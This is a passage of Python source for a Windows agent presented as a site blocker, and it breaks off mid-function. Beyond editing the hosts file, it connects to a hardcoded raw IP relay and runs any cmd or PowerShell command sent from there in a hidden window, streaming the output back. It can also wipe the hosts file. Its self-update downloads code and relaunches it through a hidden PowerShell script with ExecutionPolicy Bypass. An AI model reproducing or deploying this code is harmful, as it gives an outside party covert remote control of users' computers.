import argparse
import asyncio
import ctypes
import difflib
import json
import locale
import logging
import os
import re
import socket
import subprocess
import sys
import time
from collections import deque
from pathlib import Path
from tempfile import NamedTemporaryFile
from urllib import request
from urllib.parse import urlparse, urlunparse

import websockets


DEFAULT_RELAY_WS_URL = "ws://188.195.200.62:8000/ws"
DEFAULT_HOSTS_FILE = r"C:\Windows\System32\drivers\etc\hosts"
DEFAULT_STATUS_REPORT_INTERVAL_SECONDS = 30
DEFAULT_LOG_LEVEL_NAME = "VERBOSE"
DEFAULT_COMMAND_TIMEOUT_SECONDS = 300
MAX_COMMAND_TIMEOUT_SECONDS = 3600
DEFAULT_SELF_UPDATE_INTERVAL_SECONDS = 600
DEFAULT_RELAY_RECONNECT_DELAY_SECONDS = 10
SELF_UPDATE_FETCH_TIMEOUT_SECONDS = 30
LOG_TIMESTAMP_FORMAT = "%H:%M - %d.%m.%y"
CONFIG_PATH = Path(__file__).resolve().parent / "config.json"
SELF_PATH = Path(__file__).resolve()
BLOCK_IP = "127.0.0.1"
INSTANCE_MUTEX_NAME = "Global\\SiteBlockerRemoteAgent"
AGENT_NAME = (
    os.environ.get("AGENT_NAME", "").strip()
    or os.environ.get("COMPUTERNAME", "").strip()
    or socket.gethostname()
)
HOSTNAME_LABEL_RE = re.compile(r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$")
PENDING_LOG_MESSAGES: deque[dict[str, object]] = deque(maxlen=1000)
EXIT_CODE_FATAL = 1
EXIT_CODE_RELAY_CONNECTION_FAILURE = 10
EXIT_CODE_INVALID_RELAY_MESSAGE = 11
EXIT_CODE_INVALID_ACTION_PAYLOAD = 12
EXIT_CODE_HOSTS_NOT_FOUND = 20
EXIT_CODE_HOSTS_UNAVAILABLE = 21
RELAY_WS_URL_OVERRIDE: str | None = None
SELF_UPDATE_URL_OVERRIDE: str | None = None


def _install_verbose_log_level() -> None:
    if hasattr(logging, "VERBOSE"):
        return

    verbose_level = logging.INFO - 5
    logging.addLevelName(verbose_level, "VERBOSE")
    logging.VERBOSE = verbose_level

    def verbose(self, message, *args, **kwargs):
        if self.isEnabledFor(verbose_level):
            self._log(verbose_level, message, args, **kwargs)

    logging.Logger.verbose = verbose


_install_verbose_log_level()


logging.basicConfig(
    level=logging.VERBOSE,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt=LOG_TIMESTAMP_FORMAT,
)
logging.captureWarnings(True)


class RelayLogBufferHandler(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        try:
            message = self.format(record)
        except Exception:
            message = record.getMessage()

        PENDING_LOG_MESSAGES.append(
            {
                "level": record.levelname,
                "logger": record.name,
                "message": message,
                "created": record.created,
            }
        )


class AgentProcessError(RuntimeError):
    def __init__(self, *, exit_code: int, error_code: str, message: str):
        super().__init__(message)
        self.exit_code = exit_code
        self.error_code = error_code
        self.message = message


class AgentRestartRequested(RuntimeError):
    pass


def _load_config() -> dict:
    if not CONFIG_PATH.exists():
        return {}

    try:
        data = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        logging.warning("Ignoring invalid blocker config at %s: %s", CONFIG_PATH, exc)
        return {}

    if not isinstance(data, dict):
        logging.warning("Ignoring invalid blocker config at %s: expected an object.", CONFIG_PATH)
        return {}

    return data


def load_log_level_name() -> str:
    raw_value = os.environ.get("LOG_LEVEL", "").strip()
    if not raw_value:
        config = _load_config()
        raw_value = str(config.get("log_level", "")).strip()

    if not raw_value:
        return DEFAULT_LOG_LEVEL_NAME

    log_level_name = raw_value.upper()
    if log_level_name not in {"CRITICAL", "ERROR", "WARNING", "INFO", "DEBUG", "VERBOSE"}:
        logging.warning(
            "Ignoring invalid log level %r; using %s.",
            raw_value,
            DEFAULT_LOG_LEVEL_NAME,
        )
        return DEFAULT_LOG_LEVEL_NAME

    return log_level_name


def configure_relay_log_buffering() -> None:
    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, load_log_level_name()))
    if any(isinstance(handler, RelayLogBufferHandler) for handler in root_logger.handlers):
        return

    handler = RelayLogBufferHandler()
    handler.setLevel(logging.NOTSET)
    handler.setFormatter(logging.Formatter("%(message)s"))
    root_logger.addHandler(handler)


configure_relay_log_buffering()


def _coerce_ws_url(raw_value: str) -> str:
    parsed = urlparse(raw_value if "://" in raw_value else f"ws://{raw_value}")
    scheme = parsed.scheme.lower()

    if scheme == "http":
        scheme = "ws"
    elif scheme == "https":
        scheme = "wss"
    elif scheme not in {"ws", "wss"}:
        scheme = "ws"

    path = parsed.path.rstrip("/")
    if not path:
        path = "/ws"
    elif not path.endswith("/ws"):
        path = f"{path}/ws"

    return urlunparse(
        parsed._replace(
            scheme=scheme,
            path=path,
            params="",
            query="",
            fragment="",
        )
    )


def load_relay_ws_url() -> str:
    if RELAY_WS_URL_OVERRIDE:
        return RELAY_WS_URL_OVERRIDE

    relay_ws_url = os.environ.get("RELAY_WS_URL", "").strip()
    if relay_ws_url:
        return _coerce_ws_url(relay_ws_url)

    relay_url = os.environ.get("RELAY_URL", "").strip()
    if relay_url:
        return _coerce_ws_url(relay_url)

    config = _load_config()
    relay_ws_url = str(config.get("relay_ws_url", "")).strip()
    if relay_ws_url:
        return _coerce_ws_url(relay_ws_url)

    relay_url = str(config.get("relay_url", "")).strip()
    if relay_url:
        return _coerce_ws_url(relay_url)

    return DEFAULT_RELAY_WS_URL


def load_self_update_url() -> str:
    if SELF_UPDATE_URL_OVERRIDE is not None:
        return SELF_UPDATE_URL_OVERRIDE

    update_url = os.environ.get("AGENT_UPDATE_URL", "").strip()
    if update_url:
        return update_url

    config = _load_config()
    return str(config.get("agent_update_url", "")).strip()


def load_hosts_file() -> str:
    hosts_file = os.environ.get("HOSTS_FILE", "").strip()
    if hosts_file:
        return hosts_file

    config = _load_config()
    hosts_file = str(config.get("hosts_file", "")).strip()
    if hosts_file:
        return hosts_file

    return DEFAULT_HOSTS_FILE


def load_status_report_interval_seconds() -> int:
    raw_value = os.environ.get("STATUS_REPORT_INTERVAL_SECONDS", "").strip()
    if not raw_value:
        config = _load_config()
        raw_value = str(config.get("status_report_interval_seconds", "")).strip()

    if not raw_value:
        return DEFAULT_STATUS_REPORT_INTERVAL_SECONDS

    try:
        interval_seconds = int(raw_value)
    except ValueError:
        logging.warning(
            "Ignoring invalid status report interval %r; using %s seconds.",
            raw_value,
            DEFAULT_STATUS_REPORT_INTERVAL_SECONDS,
        )
        return DEFAULT_STATUS_REPORT_INTERVAL_SECONDS

    if interval_seconds <= 0:
        logging.warning(
            "Ignoring non-positive status report interval %r; using %s seconds.",
            raw_value,
            DEFAULT_STATUS_REPORT_INTERVAL_SECONDS,
        )
        return DEFAULT_STATUS_REPORT_INTERVAL_SECONDS

    return interval_seconds


def load_self_update_interval_seconds() -> int:
    raw_value = os.environ.get("AGENT_UPDATE_INTERVAL_SECONDS", "").strip()
    if not raw_value:
        config = _load_config()
        raw_value = str(config.get("agent_update_interval_seconds", "")).strip()

    if not raw_value:
        return DEFAULT_SELF_UPDATE_INTERVAL_SECONDS

    try:
        interval_seconds = int(raw_value)
    except ValueError:
        logging.warning(
            "Ignoring invalid self-update interval %r; using %s seconds.",
            raw_value,
            DEFAULT_SELF_UPDATE_INTERVAL_SECONDS,
        )
        return DEFAULT_SELF_UPDATE_INTERVAL_SECONDS

    if interval_seconds <= 0:
        logging.warning(
            "Ignoring non-positive self-update interval %r; using %s seconds.",
            raw_value,
            DEFAULT_SELF_UPDATE_INTERVAL_SECONDS,
        )
        return DEFAULT_SELF_UPDATE_INTERVAL_SECONDS

    return interval_seconds


def load_relay_reconnect_delay_seconds() -> int:
    raw_value = os.environ.get("RELAY_RECONNECT_DELAY_SECONDS", "").strip()
    if not raw_value:
        config = _load_config()
        raw_value = str(config.get("relay_reconnect_delay_seconds", "")).strip()

    if not raw_value:
        return DEFAULT_RELAY_RECONNECT_DELAY_SECONDS

    try:
        interval_seconds = int(raw_value)
    except ValueError:
        logging.warning(
            "Ignoring invalid relay reconnect delay %r; using %s seconds.",
            raw_value,
            DEFAULT_RELAY_RECONNECT_DELAY_SECONDS,
        )
        return DEFAULT_RELAY_RECONNECT_DELAY_SECONDS

    if interval_seconds <= 0:
        logging.warning(
            "Ignoring non-positive relay reconnect delay %r; using %s seconds.",
            raw_value,
            DEFAULT_RELAY_RECONNECT_DELAY_SECONDS,
        )
        return DEFAULT_RELAY_RECONNECT_DELAY_SECONDS

    return interval_seconds


HOSTS_FILE = load_hosts_file()
STATUS_REPORT_INTERVAL_SECONDS = load_status_report_interval_seconds()
SELF_UPDATE_INTERVAL_SECONDS = load_self_update_interval_seconds()
RELAY_RECONNECT_DELAY_SECONDS = load_relay_reconnect_delay_seconds()


def acquire_single_instance_lock():
    if sys.platform != "win32":
        return None

    handle = ctypes.windll.kernel32.CreateMutexW(None, False, INSTANCE_MUTEX_NAME)
    if not handle:
        raise OSError(ctypes.get_last_error(), "CreateMutexW failed")

    if ctypes.windll.kernel32.GetLastError() == 183:
        ctypes.windll.kernel32.CloseHandle(handle)
        return None

    return handle


def release_single_instance_lock(handle) -> None:
    if handle and sys.platform == "win32":
        ctypes.windll.kernel32.CloseHandle(handle)


def _hosts_file_exists() -> bool:
    return os.path.exists(HOSTS_FILE)


def _require_hosts_file() -> None:
    if not _hosts_file_exists():
        raise FileNotFoundError(f"Hosts file not found at {HOSTS_FILE}")


def _is_relay_transport_error(exc: BaseException) -> bool:
    websocket_exceptions = getattr(websockets, "exceptions", None)
    connection_closed_type = getattr(websocket_exceptions, "ConnectionClosed", ())
    websocket_exception_type = getattr(websocket_exceptions, "WebSocketException", ())
    transport_error_types = tuple(
        error_type
        for error_type in (connection_closed_type, websocket_exception_type, ConnectionError, OSError, EOFError)
        if isinstance(error_type, type)
    )
    return isinstance(exc, transport_error_types)


async def _send_json_payload(ws, payload: dict[str, object]) -> None:
    try:
        await ws.send(json.dumps(payload))
    except Exception as exc:
        if _is_relay_transport_error(exc):
            raise AgentProcessError(
                exit_code=EXIT_CODE_RELAY_CONNECTION_FAILURE,
                error_code="relay_connection_failed",
                message=f"Relay connection failed while sending a message: {exc}",
            ) from exc
        raise


def _is_valid_hostname(hostname: str) -> bool:
    if not hostname or len(hostname) > 253:
        return False

    labels = hostname.split(".")
    return all(HOSTNAME_LABEL_RE.fullmatch(label) for label in labels)


def _normalize_domain(value: object) -> str:
    raw_value = str(value or "").strip()
    if not raw_value:
        return ""

    parsed = urlparse(raw_value if "://" in raw_value else f"http://{raw_value}")
    domain = (parsed.hostname or "").rstrip(".").lower()
    if not _is_valid_hostname(domain):
        return ""

    return domain


def _normalize_command_shell(value: object) -> str:
    shell = str(value or "").strip().lower()
    if shell in {"cmd", "cmd.exe"}:
        return "cmd"
    if shell in {"powershell", "powershell.exe"}:
        return "powershell"
    return ""


def _normalize_source_text(value: str) -> str:
    return value.replace("\r\n", "\n").replace("\r", "\n")


def _load_local_agent_source() -> str:
    return _normalize_source_text(SELF_PATH.read_text(encoding="utf-8"))


def _fetch_remote_agent_source(update_url: str) -> str:
    update_request = request.Request(
        update_url,
        headers={"User-Agent": "site-block-agent-self-update"},
    )
    with request.urlopen(update_request, timeout=SELF_UPDATE_FETCH_TIMEOUT_SECONDS) as response:
        return _normalize_source_text(response.read().decode("utf-8-sig"))


def _powershell_literal(value: object) -> str:
    return "'" + str(value).replace("'", "''") + "'"


def _build_self_update_script(
    *,
    target_path: Path,
    update_url: str,
    script_path: Path,
    current_pid: int,
    executable_path: str,
    argv: list[str],
) -> str:
    argv_json = json.dumps(argv)
    return (
        "$ErrorActionPreference = 'Stop'\n"
        f"$targetPath = {_powershell_literal(target_path)}\n"
        f"$updateUrl = {_powershell_literal(update_url)}\n"
        f"$scriptPath = {_powershell_literal(script_path)}\n"
        f"$pythonPath = {_powershell_literal(executable_path)}\n"
        f"$workingDirectory = {_powershell_literal(str(target_path.parent))}\n"
        "$downloadPath = [System.IO.Path]::GetTempFileName()\n"
        "$argumentList = @()\n"
        "$argvJson = @'\n"
        f"{argv_json}\n"
        "'@\n"
        "$parsedArguments = ConvertFrom-Json -InputObject $argvJson\n"
        "if ($parsedArguments) { $argumentList = [string[]]$parsedArguments }\n"
        "try {\n"
        f"    while (Get-Process -Id {current_pid} -ErrorAction SilentlyContinue) {{ Start-Sleep -Milliseconds 500 }}\n"
        "    Invoke-WebRequest -Uri $updateUrl -Headers @{ 'User-Agent' = 'site-block-agent-self-update' } -OutFile $downloadPath\n"
        "    $downloadedContents = [System.IO.File]::ReadAllText($downloadPath)\n"
        "    $existingContents = ''\n"
        "    if (Test-Path -LiteralPath $targetPath) { $existingContents = [System.IO.File]::ReadAllText($targetPath) }\n"
        "    if ($downloadedContents -ne $existingContents) {\n"
        "        Move-Item -LiteralPath $downloadPath -Destination $targetPath -Force\n"
        "        $downloadPath = $null\n"
        "    }\n"
        "    Start-Process -FilePath $pythonPath -WorkingDirectory $workingDirectory -ArgumentList $argumentList -WindowStyle Hidden | Out-Null\n"
        "} finally {\n"
        "    if ($downloadPath -and (Test-Path -LiteralPath $downloadPath)) { Remove-Item -LiteralPath $downloadPath -Force }\n"
        "    if (Test-Path -LiteralPath $scriptPath) { Remove-Item -LiteralPath $scriptPath -Force }\n"
        "}\n"
    )


def _launch_self_update_script(script_path: Path) -> None:
    creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if sys.platform == "win32" else 0
    subprocess.Popen(
        [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            str(script_path),
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=creationflags,
    )


def _schedule_self_update(update_url: str) -> None:
    script_path: Path | None = None

    try:
        with NamedTemporaryFile(
            "w",
            encoding="utf-8",
            newline="\n",
            suffix=".ps1",
            prefix="site_block_agent_update_",
            delete=False,
        ) as handle:
            script_path = Path(handle.name)
            handle.write(
                _build_self_update_script(
                    target_path=SELF_PATH,
                    update_url=update_url,
                    script_path=script_path,
                    current_pid=os.getpid(),
                    executable_path=sys.executable,
                    argv=sys.argv[1:],
                )
            )

        _launch_self_update_script(script_path)
    except Exception:
        if script_path is not None and script_path.exists():
            try:
                script_path.unlink()
            except OSError:
                pass
        raise


async def _check_for_self_update() -> None:
    update_url = load_self_update_url()
    if not update_url:
        return

    try:
        remote_source = await asyncio.to_thread(_fetch_remote_agent_source, update_url)
        local_source = await asyncio.to_thread(_load_local_agent_source)
    except Exception as exc:
        logging.warning("Self-update check failed for %s: %s", update_url, exc)
        return

    if remote_source == local_source:
        return

    diff_line_count = sum(
        1
        for _line in difflib.unified_diff(
            local_source.splitlines(),
            remote_source.splitlines(),
            fromfile=str(SELF_PATH),
            tofile=update_url,
            lineterm="",
        )
    )
    logging.info(
        "Detected updated agent.py from %s (%s diff line(s)). Scheduling self-update.",
        update_url,
        diff_line_count,
    )

    try:
        await asyncio.to_thread(_schedule_self_update, update_url)
    except Exception as exc:
        logging.error("Failed to schedule self-update from %s: %s", update_url, exc)
        return

    raise AgentRestartRequested("Agent self-update scheduled.")


async def _periodic_self_update_check() -> None:
    while True:
        await _check_for_self_update()
        await asyncio.sleep(SELF_UPDATE_INTERVAL_SECONDS)


def _hosts_line(domain: str) -> str:
    return f"{BLOCK_IP}      {domain}"


def _read_hosts_lines() -> list[str]:
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8-sig") as handle:
            return handle.read().splitlines()
    except FileNotFoundError:
        return []


def _print_hosts_file() -> int:
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8-sig") as handle:
            sys.stdout.write(handle.read())
    except OSError as exc:
        print(f"Failed to read hosts file at {HOSTS_FILE}: {exc}", file=sys.stderr)
        return 1

    return 0


def _write_hosts_lines(lines: list[str]) -> None:
    with open(HOSTS_FILE, "w", encoding="utf-8", newline="\n") as handle:
        handle.write("\n".join(lines))
        if lines:
            handle.write("\n")


def _erase_hosts_file() -> None:
    _require_hosts_writable()
    with open(HOSTS_FILE, "r+", encoding="utf-8-sig", newline="\n") as handle:
        handle.seek(0)
        handle.truncate(0)
    _flush_dns()


def _blocked_domain_from_line(line: str) -> str | None:
    stripped_line = line.strip()
    if not stripped_line or stripped_line.startswith("#"):
        return None

    tokens = stripped_line.split()
    if len(tokens) < 2:
        return None

    return tokens[1].lower()


def _managed_domain_from_line(line: str) -> str | None:
    return _blocked_domain_from_line(line)


def _managed_domains_from_hosts() -> list[str]:
    return sorted(
        {
            domain
            for line in _read_hosts_lines()
            if (domain := _managed_domain_from_line(line)) is not None
        }
    )


def _reconcile_managed_lines(
    lines: list[str],
    desired_domains: set[str],
) -> tuple[list[str], bool]:
    normalized_desired_domains = {domain.lower() for domain in desired_domains if domain}
    reconciled_lines: list[str] = []
    kept_managed_domains: set[str] = set()
    changed = False

    for line in lines:
        managed_domain = _managed_domain_from_line(line)
        if managed_domain is None:
            reconciled_lines.append(line)
            continue

        if managed_domain not in normalized_desired_domains:
            changed = True
            continue

        if managed_domain in kept_managed_domains:
            changed = True
            continue

        canonical_line = _hosts_line(managed_domain)
        if line.rstrip() != canonical_line:
            changed = True

        reconciled_lines.append(canonical_line)
        kept_managed_domains.add(managed_domain)

    missing_domains = sorted(normalized_desired_domains - kept_managed_domains)
    if missing_domains:
        changed = True
        reconciled_lines.extend(_hosts_line(domain) for domain in missing_domains)

    return reconciled_lines, changed


def _flush_dns() -> None:
    subprocess.run(
        ["ipconfig", "/flushdns"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )


def _require_hosts_writable() -> None:
    _require_hosts_file()
    with open(HOSTS_FILE, "r+", encoding="utf-8-sig"):
        pass


def _update_blocks(
    *,
    add_domains: list[str] | None = None,
    remove_domains: list[str] | None = None,
) -> None:
    normalized_add_domains = {
        domain.lower() for domain in (add_domains or []) if domain
    }
    normalized_remove_domains = {
        domain.lower() for domain in (remove_domains or []) if domain
    }

    if not normalized_add_domains and not normalized_remove_domains:
        return

    _require_hosts_writable()
    lines = _read_hosts_lines()
    current_managed_domains = {
        domain
        for line in lines
        if (domain := _managed_domain_from_line(line)) is not None
    }
    desired_domains = (current_managed_domains | normalized_add_domains) - normalized_remove_domains
    reconciled_lines, changed = _reconcile_managed_lines(lines, desired_domains)

    if not changed:
        return

    _write_hosts_lines(reconciled_lines)
    _flush_dns()


def _add_block(domain: str) -> None:
    domain = domain.lower()
    if not domain:
        logging.warning("Skipping empty domain for block")
        return

    _update_blocks(add_domains=[domain])


def _remove_block(domain: str) -> None:
    domain = domain.lower()
    if not domain:
        logging.warning("Skipping empty domain for unblock")
        return

    _update_blocks(remove_domains=[domain])


def _apply_domains(domains: list[str]) -> None:
    _require_hosts_writable()
    desired_domains = {domain.lower() for domain in domains if domain}
    lines = _read_hosts_lines()
    reconciled_lines, changed = _reconcile_managed_lines(lines, desired_domains)

    if not changed:
        return

    _write_hosts_lines(reconciled_lines)
    _flush_dns()


def _require_message_domain(data: dict) -> str:
    saw_target = False

    for key in ("domain", "url"):
        if key not in data:
            continue
        saw_target = True
        domain = _normalize_domain(data.get(key))
        if domain:
            return domain

    if saw_target:
        raise ValueError("Relay message does not contain a valid hostname.")

    raise ValueError("Relay message is missing a hostname target.")


def _require_message_domains(data: dict) -> list[str]:
    saw_target_list = False
    normalized_domains: list[str] = []
    seen: set[str] = set()

    for key in ("domains", "urls"):
        values = data.get(key)
        if values is None:
            continue

        saw_target_list = True
        if not isinstance(values, list):
            raise ValueError(f"Relay message field '{key}' must be a list.")

        for value in values:
            domain = _normalize_domain(value)
            if not domain:
                raise ValueError(f"Relay message field '{key}' contains an invalid hostname: {value!r}")
            if domain in seen:
                continue
            seen.add(domain)
            normalized_domains.append(domain)

    if saw_target_list:
        return normalized_domains

    raise ValueError("Relay message is missing a hostname list.")


async def _send_agent_status(
    ws,
    *,
    status: str,
    error_code: str | None = None,
    message: str | None = None,
    domains: list[str] | None = None,
) -> None:
    payload = {
        "type": "agent_status",
        "status": status,
        "agent_name": AGENT_NAME,
    }
    if error_code is not None:
        payload["error_code"] = error_code
    if message is not None:
        payload["message"] = message
    if domains is not None:
        payload["domains"] = domains

    await _send_json_payload(ws, payload)


async def _send_action_result(
    ws,
    *,
    request_id: str | None,
    status: str,
    error_code: str | None = None,
    message: str | None = None,
    extra_fields: dict[str, object] | None = None,
) -> None:
    if not request_id:
        return

    payload = {
        "type": "agent_action_result",
        "agent_name": AGENT_NAME,
        "request_id": request_id,
        "status": status,
    }
    if error_code is not None:
        payload["error_code"] = error_code
    if message is not None:
        payload["message"] = message
    if extra_fields:
        payload.update(extra_fields)

    await _send_json_payload(ws, payload)


async def _send_agent_exit(
    ws,
    *,
    exit_code: int,
    error_code: str,
    message: str,
) -> None:
    payload = {
        "type": "agent_exit",
        "agent_name": AGENT_NAME,
        "exit_code": exit_code,
        "error_code": error_code,
        "message": message,
        "created": time.time(),
    }
    await _send_json_payload(ws, payload)


async def _send_command_output(
    ws,
    *,
    request_id: str | None,
    shell: str,
    stream: str,
    message: str,
) -> None:
    if not request_id:
        return

    payload = {
        "type": "agent_command_output",
        "agent_name": AGENT_NAME,
        "request_id": request_id,
        "shell": shell,
        "stream": stream,
        "message": message,
        "created": time.time(),
    }
    await _send_json_payload(ws, payload)


async def _raise_agent_failure(
    ws,
    *,
    exit_code: int,
    error_code: str,
    message: str,
    request_id: str | None = None,
) -> None:
    logging.error("%s", message)

    if ws is not None:
        if request_id is not None:
            try:
                await _send_action_result(
                    ws,
                    request_id=request_id,
                    status="error",
                    error_code=error_code,
                    message=message,
                )
            except Exception:
                logging.debug("Failed to send action error to relay.", exc_info=True)

        try:
            await _send_agent_exit(
                ws,
                exit_code=exit_code,
                error_code=error_code,
                message=message,
            )
        except Exception:
            logging.debug("Failed to send exit notice to relay.", exc_info=True)

    raise AgentProcessError(
        exit_code=exit_code,
        error_code=error_code,
        message=message,
    )


def _require_run_payload(data: dict) -> tuple[str, list[str], int]:
    shell = _normalize_command_shell(data.get("shell"))
    if not shell:
        raise ValueError("Relay run action requires shell 'cmd' or 'powershell'.")

    arguments = data.get("arguments")
    if not isinstance(arguments, list) or not arguments:
        raise ValueError("Relay run action requires a non-empty 'arguments' list.")

    normalized_arguments: list[str] = []
    for value in arguments:
        if not isinstance(value, str):
            raise ValueError("Relay run action arguments must all be strings.")
        normalized_arguments.append(value)

    timeout_value = data.get("timeout_seconds", DEFAULT_COMMAND_TIMEOUT_SECONDS)
    if not isinstance(timeout_value, int):
        raise ValueError("Relay run action timeout_seconds must be an integer.")
    if timeout_value <= 0 or timeout_value > MAX_COMMAND_TIMEOUT_SECONDS:
        raise ValueError(
            f"Relay run action timeout_seconds must be between 1 and {MAX_COMMAND_TIMEOUT_SECONDS} seconds."
        )

    return shell, normalized_arguments, timeout_value


def _build_shell_invocation(shell: str, arguments: list[str]) -> tuple[str, list[str]]:
    if shell == "cmd":
        lowered_arguments = [argument.lower() for argument in arguments]
        if any(argument == "/k" for argument in lowered_arguments):
            raise ValueError("cmd shell runs must use /c, not /k.")

        invocation_arguments = list(arguments)
        if "/d" not in lowered_arguments:
            invocation_arguments.insert(0, "/d")
        if "/c" not in lowered_arguments:
            invocation_arguments.insert(1 if invocation_arguments and invocation_arguments[0].lower() == "/d" else 0, "/c")

        return "cmd.exe", invocation_arguments

    lowered_arguments = [argument.lower() for argument in arguments]
    if any(argument == "-noexit" for argument in lowered_arguments):
        raise ValueError("powershell shell runs must not use -NoExit.")

    invocation_arguments = ["-NoLogo", "-NoProfile", "-NonInteractive", *arguments]
    return "powershell.exe", invocation_arguments


async def _pump_command_output(
    ws,
    *,
    request_id: str | None,
    shell: str,
    stream_name: str,
    stream_reader,
    encoding: str,
) -> None:
    while True:
        chunk = await stream_reader.readline()
        if not chunk:
            return

        message = chunk.decode(encoding, errors="replace").rstrip("\r\n")
        if not message:
            continue

        await _send_command_output(
            ws,
            request_id=request_id,
            shell=shell,
            stream=stream_name,
            message=message,
        )


async def _run_background_command(
    ws,
    *,
    request_id: str | None,
    shell: str,
    arguments: list[str],
    timeout_seconds: int,
) -> dict[str, object]:
    executable, invocation_arguments = _build_shell_invocation(shell, arguments)
    display_command = subprocess.list2cmdline([executable, *invocation_arguments])
    encoding = locale.getpreferredencoding(False) or "utf-8"

    await _send_command_output(
        ws,
        request_id=request_id,
        shell=shell,
        stream="meta",
        message=f"Starting {display_command}",
    )

    startupinfo = None
    creationflags = 0
    if sys.platform == "win32":
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)

    try:
        process = await asyncio.create_subprocess_exec(
            executable,
            *invocation_arguments,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.DEVNULL,
            startupinfo=startupinfo,
            creationflags=creationflags,
        )
    except OSError as exc:
        message = f"Failed to start {executable}: {exc}"
        await _send_command_output(
            ws,
            request_id=request_id,
            shell=shell,
            stream="stderr",
            message=message,
        )
        return {
            "command_status": "failed",
            "exit_code": None,
            "message": message,
        }

    stdout_task = asyncio.create_task(
        _pump_command_output(
            ws,
            request_id=request_id,
            shell=shell,
            stream_name="stdout",
            stream_reader=process.stdout,
            encoding=encoding,
        )
    )
    stderr_task = asyncio.create_task(
        _pump_command_output(
            ws,
            request_id=request_id,
            shell=shell,
            stream_name="stderr",
            stream_reader=process.stderr,
            encoding=encoding,
        )
    )

    try:
        try:
            await asyncio.wait_for(process.wait(), timeout=timeout_seconds)
            exit_code = process.returncode
            command_status = "succeeded" if exit_code == 0 else "failed"
            message = f"Command exited with code {exit_code}."
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
            exit_code = None
            command_status = "timed_out"
            message = f"Command timed out after {timeout_seconds} seconds and was terminated."
    finally:
        await asyncio.gather(stdout_task, stderr_task, return_exceptions=True)

    await _send_command_output(
        ws,
        request_id=request_id,
        shell=shell,
        stream="meta",
        message=message,
    )

    return {
        "command_status": command_status,
        "exit_code": exit_code,
        "message": message,
    }


async def _forward_log_messages(ws) -> None:
    while True:
        while PENDING_LOG_MESSAGES:
            payload = {"type": "agent_log", "agent_name": AGENT_NAME}
            payload.update(PENDING_LOG_MESSAGES.popleft())
            await _send_json_payload(ws, payload)

        await asyncio.sleep(1)


async def _report_current_status(ws) -> None:
    try:
        _require_hosts_writable()
        domains = _managed_domains_from_hosts()
    except FileNotFoundError as exc:
        await _raise_agent_failure(
            ws,
            exit_code=EXIT_CODE_HOSTS_NOT_FOUND,
            error_code="hosts_not_found",
            message=str(exc),
        )
    except OSError as exc:
        await _raise_agent_failure(
            ws,
            exit_code=EXIT_CODE_HOSTS_UNAVAILABLE,
            error_code="hosts_unavailable",
            message=f"Failed to update hosts file at {HOSTS_FILE}: {exc}",
        )

    await _send_agent_status(ws, status="ready", domains=domains)


async def _handle_relay_message(ws, data: dict) -> None:
    action = data.get("action")
    request_id = str(data.get("request_id", "")).strip() or None

    try:
        if action == "init":
            _apply_domains(_require_message_domains(data))
        elif action == "refresh":
            _apply_domains(_require_message_domains(data))
        elif action == "erase":
            _erase_hosts_file()
        elif action == "block":
            _add_block(_require_message_domain(data))
        elif action == "unblock":
            _remove_block(_require_message_domain(data))
        elif action == "run":
            shell, arguments, timeout_seconds = _require_run_payload(data)
            command_result = await _run_background_command(
                ws,
                request_id=request_id,
                shell=shell,
                arguments=arguments,
                timeout_seconds=timeout_seconds,
            )
            await _send_action_result(
                ws,
                request_id=request_id,
                status="ok",
                message=str(command_result["message"]),
                extra_fields={
                    "command_status": command_result["command_status"],
                    "exit_code": command_result["exit_code"],
                },
            )
            await _report_current_status(ws)
            return
        else:
            raise ValueError(f"Unknown relay action: {action!r}")
    except ValueError as exc:
        await _raise_agent_failure(
            ws,
            exit_code=EXIT_CODE_INVALID_ACTION_PAYLOAD,
            request_id=request_id,
            error_code="invalid_action_payload",
            message=str(exc),
        )
    except FileNotFoundError as exc:
        await _raise_agent_failure(
            ws,
            exit_code=EXIT_CODE_HOSTS_NOT_FOUND,
            request_id=request_id,
            error_code="hosts_not_found",
            message=str(exc),
        )
    except OSError as exc:
        await _raise_agent_failure(
            ws,
            exit_code=EXIT_CODE_HOSTS_UNAVAILABLE,
            request_id=request_id,
            error_code="hosts_unavailable",
            message=f"Failed to update hosts file at {HOSTS_FILE}: {exc}",
        )

    await _send_action_result(
        ws,
        request_id=request_id,
        status="ok",
        message="Agent applied the action.",
    )
    await _report_current_status(ws)


async def _periodic_status_report(ws) -> None:
    while True:
        await asyncio.sleep(STATUS_REPORT_INTERVAL_SECONDS)
        await _report_current_status(ws)


async def listen() -> None:
    relay_ws_url = load_relay_ws_url()

    try:
        async with websockets.connect(relay_ws_url) as ws:
            logging.info("Connected to relay: %s", relay_ws_url)
            try:
                status_task = None
                log_task = None
                self_update_task = None
                receive_task = None
                await _report_current_status(ws)
                status_task = asyncio.create_task(_periodic_status_report(ws))
                log_task = asyncio.create_task(_forward_log_messages(ws))
                if load_self_update_url():
                    self_update_task = asyncio.create_task(_periodic_self_update_check())
                receive_task = asyncio.create_task(ws.recv())
                try:
                    while True:
                        done, _pending = await asyncio.wait(
                            {task for task in (status_task, log_task, self_update_task, receive_task) if task is not None},
                            return_when=asyncio.FIRST_COMPLETED,
                        )

                        if status_task in done:
                            await status_task

                        if log_task in done:
                            await log_task

                        if self_update_task in done:
                            await self_update_task

                        if receive_task in done:
                            try:
                                raw_message = await receive_task
                            except AgentProcessError:
                                raise
                            except Exception as exc:
                                if _is_relay_transport_error(exc):
                                    raise AgentProcessError(
